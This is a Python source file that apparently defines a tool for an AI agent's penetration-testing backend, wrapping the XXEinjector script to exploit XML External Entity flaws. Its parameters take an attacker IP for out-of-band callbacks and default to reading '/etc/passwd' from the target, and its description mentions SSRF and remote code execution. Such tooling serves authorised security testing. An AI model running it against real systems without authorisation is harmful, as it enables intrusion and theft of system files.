from __future__ import annotations
from typing import Any
from backend.agent.tools.base import BaseTool, ToolResult, OnOutputCallback
from backend.agent.tools import executor


class XxeinjectorTool(BaseTool):
    name = "run_xxeinjector"
    description = (
        "Test for XML External Entity (XXE) injection vulnerabilities using XXEinjector. "
        "Automatically exploits XXE flaws to read local files, perform SSRF, or achieve RCE via OOB techniques."
    )
    parameters = {
        "type": "object",
        "properties": {
            "host": {"type": "string", "description": "Attacker's IP address for OOB callbacks"},
            "file": {"type": "string", "description": "Path to an HTTP request file containing the XML injection point"},
            "path": {"type": "string", "description": "Path to attempt file read from target (default '/')"},
            "remote_file": {"type": "string", "description": "Remote file to read from target (e.g. '/etc/passwd')"},
        },
        "required": ["host", "file"],
    }

    async def run(self, on_output: OnOutputCallback, host: str, file: str, path: str = "/", remote_file: str = "/etc/passwd", **_: Any) -> ToolResult:
        args = [
            "ruby", "/opt/XXEinjector/XXEinjector.rb",
            f"--host={host}",
            f"--path={path}",
            f"--file={file}",
            f"--remote={remote_file}",
        ]
        return await executor.execute(self.name, args, on_output, timeout=120)
